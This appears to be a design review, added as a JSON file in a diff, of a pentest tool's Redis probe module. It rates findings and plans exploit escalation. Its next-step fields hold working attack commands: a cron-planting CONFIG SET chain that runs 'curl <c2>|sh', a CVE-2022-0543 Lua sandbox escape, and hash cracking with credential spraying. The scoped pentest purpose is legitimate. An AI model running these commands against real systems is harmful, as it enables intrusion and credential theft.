@@ -1,0 +1,64 @@
+{
+  "service": "redis",
+  "summary": "Solid RESP + INFO + CONFIG probe with two real T3/T2 promotions already shipped: ACL GETUSER hash harvest and CVE-2022-0543 Lua-sandbox flag verification. Biggest gap: it enumerates write-primitive preconditions (dir/dbfilename/persistence/module_load) inside mongo_unauth text but never emits the RCE primitive as its own probe, and doesn't attempt SLAVEOF module load or the LOADSCRIPT canary. No auth/weak-pw sweep against instances that require AUTH.",
+  "module_files": [
+    "recce/services/db/redis.py"
+  ],
+  "findings": [
+    {
+      "kind": "redis_unauth",
+      "title_pattern": "Redis exposed without authentication",
+      "severity": "critical",
+      "tier": "t2",
+      "tier_evidence": "INFO + CONFIG GET actually complete and return keyspace/keys count/config values; enumerates which RCE paths are reachable (module_load, persistence, role=master) but does not invoke them.",
+      "can_promote_to": "t3",
+      "promotion_notes": "The classic CONFIG SET dir + dbfilename + SAVE chain (SSH authorized_keys / cron / webshell) is a destructive T3 write; keep it opt-in behind a --exploit-ok gate. Non-destructive T3 is publishing every harvested key/hash to the loot pool (partly done via ACL).",
+      "promotion_risk": "destructive",
+      "tester_next_step": "redis-cli -h <ip> -p <port> --scan | head -50 ; redis-cli -h <ip> -p <port> DUMP <key> ; only in scope: CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET dbfilename root; SET x '\\n\\n* * * * * curl <c2>|sh\\n\\n'; SAVE.",
+      "related_cves": []
+    },
+    {
+      "kind": "redis_cve_2022_0543",
+      "title_pattern": "Redis Lua sandbox escape (CVE-2022-0543) - unauth RCE",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Runs EVAL 'if package and package.loadlib then return 1 else return 0 end' 0 - a safe reflection probe that positively identifies the vulnerable code path without invoking loadlib.",
+      "can_promote_to": "t2",
+      "promotion_notes": "T2 = actually load the local liblua .so and execute a harmless PoC (e.g. io.popen('id')) to a canary sink. Currently only the primitive is verified.",
+      "promotion_risk": "high",
+      "tester_next_step": "redis-cli -h <ip> -p <port> EVAL 'local f=package.loadlib(\"/lib/x86_64-linux-gnu/liblua5.1.so.0\",\"luaopen_io\"); local io=f(); return io.popen(\"id\"):read(\"*a\")' 0 - only within engagement scope.",
+      "related_cves": [
+        "CVE-2022-0543"
+      ]
+    },
+    {
+      "kind": "redis_acl_users",
+      "title_pattern": "Redis ACL user list and password hashes reachable",
+      "severity": "medium",
+      "tier": "t3",
+      "tier_evidence": "ACL USERS + ACL GETUSER read the SHA-256 password hash bytes for every configured user - real credential material for hashcat -m 1400.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed harvested hashes into a shared credential-cracking loop; auto-replay cracked (user,pw) via AUTH against other Redis instances and via password-spray to SSH/SMB.",
+      "promotion_risk": "low",
+      "tester_next_step": "echo '<sha256>' | hashcat -m 1400 rockyou.txt --username <user> ; cracked pair -> redis-cli -h <other> AUTH <user> <pw>; also try the same pw at OS.",
+      "related_cves": []
+    },
+    {
+      "kind": "redis_version",
+      "title_pattern": "Redis end-of-life / legacy build",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "INFO server 'redis_version' compared to 6.0 floor; no CVE probe.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Wire vulndb per-version CVE map (Lua-sandbox 4.x escapes, master-slave sync CVE-2020-14147) as their own kinds with version-only T1 verification.",
+      "promotion_risk": "none",
+      "tester_next_step": "redis-cli -h <ip> -p <port> INFO server ; cross-reference redis.io/topics/security advisories.",
+      "related_cves": []
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "credentials.hash (SHA-256 hashes for m=1400 crack loop)",
+    "known_users (redis ACL usernames -> generic spray)",
+    "loot.keydump (SCAN + DUMP output as evidence)"
+  ]
+}
